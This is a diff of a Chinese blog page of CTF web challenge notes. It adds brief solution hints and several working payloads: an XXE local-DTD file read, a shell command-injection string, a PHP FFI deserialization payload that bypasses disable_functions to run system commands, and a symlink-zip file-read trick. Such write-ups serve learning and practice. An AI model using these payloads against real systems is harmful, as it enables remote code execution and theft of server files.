@@ -481,21 +481,21 @@ function get_the_flag()&amp;#123;
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-10-08
+                    2023-05-16
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    24.2k
+                    25.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    116 分
+                    123 分
                 </div>
                 
 
@@ -3239,7 +3239,157 @@ e
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825121558457.png" alt="image-20220825121558457"></p>
 <p>可以看到有个mysqli_num_rows函数来判断返回的行数，若为1才会进入if里面的内容，而在数据库里插入了两条数据<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825121702801.png" alt="image-20220825121702801"></p>
 <p>所以这里万能密码后边必须加上limit 0,1才能成功</p>
-<h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2>
+<h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><h2 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h2><p>上传session文件伪造session。</p>
+<h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>thinkphp框架上传文件数组绕过 <strong>php</strong> 后缀限制。</p>
+<h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p>通过调用本地dtd使XML报错读取敏感信息</p>
+<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span> <span class="token punctuation">[</span><span class="token internal-subset">
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">message</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">m</span> <span class="token attr-name">"135601360123502401401250"</span><span class="token punctuation">></span></span>
+&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+&lt;!ENTITY % ISOamsa '
+&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> flag SYSTEM "file:///flag">
+&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> getflag "&lt;!ENTITY <span class="token entity" title="&#38;">&amp;#38;</span>#37; test SYSTEM <span class="token entity" title="&#39;">&amp;#39;</span>file:///<span class="token entity" title="&#37;">&amp;#37;</span>flag;<span class="token entity" title="&#39;">&amp;#39;</span>>">
+'>
+%local_dtd;%getflag;%test;
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&m;">&amp;m;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span></code></pre>
+
+<h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><p>xpath注入</p>
+<h2 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2><p>ssti注入</p>
+<h2 id="WMCTF2020-Make-PHP-Great-Again-2-0"><a href="#WMCTF2020-Make-PHP-Great-Again-2-0" class="headerlink" title="[WMCTF2020]Make PHP Great Again 2.0"></a>[WMCTF2020]Make PHP Great Again 2.0</h2><p>绕过require_once</p>
+<h2 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h2><p>flask session伪造</p>
+<h2 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h2><p>.htaccess的使用</p>
+<h2 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h2><p>ssti注入</p>
+<h2 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h2><p>双写任意文件读取</p>
+<h2 id="NESTCTF-2019-Love-Math-2"><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h2><p>利用数学函数和异或构造get语句，执行命令</p>
+<h2 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h2><p>jwt伪造</p>
+<h2 id="羊城杯-2020-Easyphp2"><a href="#羊城杯-2020-Easyphp2" class="headerlink" title="[羊城杯 2020]Easyphp2"></a>[羊城杯 2020]Easyphp2</h2><p>用管道符和引号闭合命令，实现命令执行，然后su切换用户，或者在环境变量里得到flag</p>
+<pre class="language-none"><code class="language-none">1&#39;|echo &#96;env&#96;||&#39;</code></pre>
+
+<h2 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h2><p>一个套到不能再套的http报文修改了</p>
+<h2 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h2><p>python反序列化</p>
+<h2 id="2020-新春红包题-1"><a href="#2020-新春红包题-1" class="headerlink" title="[2020 新春红包题]1"></a>[2020 新春红包题]1</h2><p>php反序列化</p>
+<h2 id="网鼎杯-2020-青龙组-filejava"><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h2><p>java的xxe</p>
+<p>（没做出来，很怪，照抄的payload连dnslog都没有，更别提外带了</p>
+<h2 id="安洵杯-2019-iamthinking"><a href="#安洵杯-2019-iamthinking" class="headerlink" title="[安洵杯 2019]iamthinking"></a>[安洵杯 2019]iamthinking</h2><p>thinkphp的代码审计</p>
+<h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p>pug文件的命令执行和nodejs8.0版本导致的切分攻击造成的请求走私</p>
+<h2 id="CISCN2019-总决赛-Day1-Web4-Laravel1"><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a>[CISCN2019 总决赛 Day1 Web4]Laravel1</h2><p>Laravel的代码审计，审个反序列化链子出来</p>
+<h2 id="watevrCTF-2019-Supercalc"><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h2><p>用报错的方式得到secret_key，然后实现伪造session</p>
+<h2 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2><p>perl的文件上传，利用了param()函数和&lt;$file&gt;，两个尖括号这种读文件的方式</p>
+<p>（很怪，这种源码是怎么猜出来的</p>
+<blockquote>
+<p>param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。</p>
+</blockquote>
+<h2 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h2><p>伪造php session</p>
+<h2 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h2><p><strong>FFI</strong>：<strong>实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions</strong></p>
+<p>是 <strong>PHP7.4</strong> 中新加入的功能</p>
+<p>opcache.preload：/var/www/html/preload.php</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload">opcache.preload</a> 是 <strong>PHP7.4</strong> 中新加入的功能。如果设置了 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload">opcache.preload</a> ，那么在所有Web应用程序运行之前，服务会先将设定的 <strong>preload</strong> 文件加载进内存中，使这些 <strong>preload</strong> 文件中的内容对之后的请求均可用。更多细节可以阅读：<a target="_blank" rel="noopener" href="https://wiki.php.net/rfc/preload">https://wiki.php.net/rfc/preload</a> ，在这篇文档尾巴可以看到如下描述：</p>
+<blockquote>
+<p> 允许在 <strong>preload</strong> 文件中使用 <strong>FFI</strong> 拓展</p>
+</blockquote>
+<p>在这个题目里的preload.php内容为</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+final class A implements Serializable &#123;
+    protected $data &#x3D; [
+        &#39;ret&#39; &#x3D;&gt; null,
+        &#39;func&#39; &#x3D;&gt; &#39;print_r&#39;,
+        &#39;arg&#39; &#x3D;&gt; &#39;1&#39;
+    ];
+private function run () &#123;
+    $this-&gt;data[&#39;ret&#39;] &#x3D; $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);
+&#125;
+
+public function __serialize(): array &#123;
+    return $this-&gt;data;
+&#125;
+
+public function __unserialize(array $data) &#123;
+    array_merge($this-&gt;data, $data);
+    $this-&gt;run();
+&#125;
+
+public function serialize (): string &#123;
+    return serialize($this-&gt;data);
+&#125;
+
+public function unserialize($payload) &#123;
+    $this-&gt;data &#x3D; unserialize($payload);
+    $this-&gt;run();
+&#125;
+
+public function __get ($key) &#123;
+    return $this-&gt;data[$key];
+&#125;
+
+public function __set ($key, $value) &#123;
+    throw new \Exception(&#39;No implemented&#39;);
+&#125;
+
+public function __construct () &#123;
+    throw new \Exception(&#39;No implemented&#39;);
+&#125;
+&#125;</code></pre>
+<p>然后按照官方文档FFI可以直接执行php语句</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+$ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);
+$ffi-&gt;system(&quot;id &gt; &#x2F;tmp&#x2F;eki&quot;);
+echo file_get_contents(&quot;&#x2F;tmp&#x2F;eki&quot;);
+@unlink(&quot;&#x2F;tmp&#x2F;eki&quot;);</code></pre>
+
+<p>所以在这个题里可以利用run方法直接执行命令</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+final class A implements Serializable &#123;
+    protected $data &#x3D; [
+        &#39;ret&#39; &#x3D;&gt; null,
+        &#39;func&#39; &#x3D;&gt; &#39;FFI::cdef&#39;,
+        &#39;arg&#39; &#x3D;&gt; &#39;int system(const char *command);&#39;
+    ];
+
+
+    public function serialize (): string &#123;
+        return serialize($this-&gt;data);
+    &#125;
+
+    public function unserialize($payload) &#123;
+        $this-&gt;data &#x3D; unserialize($payload);
+    &#125;
+
+&#125;
+$a &#x3D; new A();
+echo serialize($a);</code></pre>
+
+<p>这里对生成的序列化内容进行反序列化后，再调用它的__serialize方法就可以跳到run方法里，run方法里的语句现在就相当于<code>$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);</code></p>
+<p>然后就是<code>$ffi-&gt;system(&quot;id &gt; /tmp/eki&quot;);</code>，也就是</p>
+<p><code>__serialize()[&#39;ret&#39;]-&gt;system(&quot;whoami &gt; /var/www/html/test.txt&quot;);</code></p>
+<p>最终payload为<code>a=$a=unserialize(&#39;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#39;)-&gt;__serialize()[&#39;ret&#39;]-&gt;system(&quot;cat /f*&gt; /var/www/html/test.txt&quot;);</code></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516164713321.png" alt="image-20230516164713321"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516165019304.png" alt="image-20230516165019304"></p>
+<p>都写到这了，就再说一说其它几种饶过disable_function的方式</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516165131452.png" alt="image-20230516165131452"></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/karsa/p/13051079.html">https://www.cnblogs.com/karsa/p/13051079.html</a></p>
+<h2 id="FBCTF2019-Event"><a href="#FBCTF2019-Event" class="headerlink" title="[FBCTF2019]Event"></a>[FBCTF2019]Event</h2><p>flask session伪造</p>
+<h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>flask session伪造+文件上传软连接</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">1.在 linux 中，&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;会指向进程的当前目录，在不知道 flask 工作目录时，我们可以用&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag&#x2F;flag.jpg来访问 flag.jpg。
+2.ln -s是Linux的软连接命令,其类似与windows的快捷方式。比如ln -s &#x2F;etc&#x2F;passwd shawroot 这会出现一个名为shawroot的文件,其内容为&#x2F;etc&#x2F;passwd的内容。
+</code></pre>
+
+<p>这里对有软连接的压缩包解压出的内容就是软连接对应的文件内容</p>
+<p>也就说，如果我们使用ln -s /proc/self/cwd/flag/flag.jpg test</p>
+<p>然后再对test文件进行压缩</p>
+<p>zip -ry test.zip test </p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">-r：将指定的目录下的所有子目录以及文件一起处理
+
+-y：直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。</code></pre>
+
+<p>到时候上传到服务器上，服务器进行解压后再显示的内容就也是 /proc/self/cwd/flag/flag.jpg的内容</p>
+<h2 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h2><p><strong>Undefsafe 模块原型链污染（CVE-2019-10795）</strong></p>
+<p><strong>&lt; 2.0.3</strong></p>
+<h2 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h2><p>伪造session</p>
+<p>python反序列化</p>
+<h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>构造PHP_SESSION_UPLOAD_PROGRESS的POST请求。就会自动进行session_start()，从而绕过session的判断</p>
+
                 
             </div>
             <hr/>
@@ -4028,7 +4178,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">195.4k</span>
+                        class="white-color">231k</span>
             
             
             
